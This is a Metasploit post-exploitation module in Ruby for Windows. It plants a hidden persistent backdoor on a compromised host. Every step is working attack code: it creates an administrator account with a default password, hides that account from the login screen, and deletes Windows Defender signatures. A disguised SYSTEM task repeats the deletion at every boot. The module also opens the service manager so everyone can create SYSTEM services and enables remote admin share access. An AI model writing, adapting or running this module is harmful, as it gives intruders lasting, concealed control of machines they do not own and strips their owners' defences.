require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows'


class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Account_peristence',
      'Description'   => %q{
        this module can give you a very strong footing and stay hidden. first the module will create a new user then add it to administrators group then hide the user created from login boot windows logo and module will remove windows malware signature every boot and module will modify registry to change administrator folder permissions so you can read write . then allow all users to create service with system account.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'alwansec@',
      'Platform'      => ['windows'],
      'SessionTypes'  => ['meterpreter']
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'Name of the user to create']),
        OptString.new('PASSWORD', [true, 'Password for the new user']),
      ]
    )

    datastore['USERNAME'] ||= 'newuser'
    datastore['PASSWORD'] ||= 'P@ssw0rd123'
    datastore['GROUPNAME'] ||= 'Administrators'
  end

  def run
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    groupname = datastore['GROUPNAME']
    

    
     output = cmd_exec("net user #{username} #{password} /add")
    if output.include? "account already exists."
    	print_error("username already in use")
    	sleep(0.5)
    	print_error("Please add a username that is not already in the system")
    	sleep(0.5)
    	return
    end
    
    if output.include? "successfully."
    	print_status("is creating a backdoor account '#{username}'") 
    	sleep(0.5)
    	
    else
    	print_error("access Danied. Pleas check your Permission.")
    	sleep(0.5)
    	return
    end
    

    
    print_status("added the account #{username} to the #{groupname} group")
    sleep(0.5)
    cmd_exec("net localgroup #{groupname} #{username} /add")
    sleep(0.5)
    
    print_status("hide account from login logo")
    cmd_exec("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v #{username} /d 0 /f")
    sleep(0.5)
    
    print_status("removed all windows defender signatures")
    cmd_exec("C:\\Program Files\\Windows Defender\\MpCmdRun.exe -RemoveDefinitions -All")
    cmd_exec("schtasks /create /tn \"Defender Security System\" /tr \"\\\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\\\" -RemoveDefinitions -All\" /sc onstart /ru System")
    sleep(0.5)
    
    
    print_status("setting the security descriptor on the service manager to allow anyone to start SYSTEM services!")
    cmd_exec("sc.exe sdset scmanager D:(A;;KA;;;WD)")
    sleep(0.5)
    
    print_status("allows read write administrator share folder")
    cmd_exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f')
    sleep(0.5)
    print_good("success. have fun with your hidden account :)")    

    
  end

end
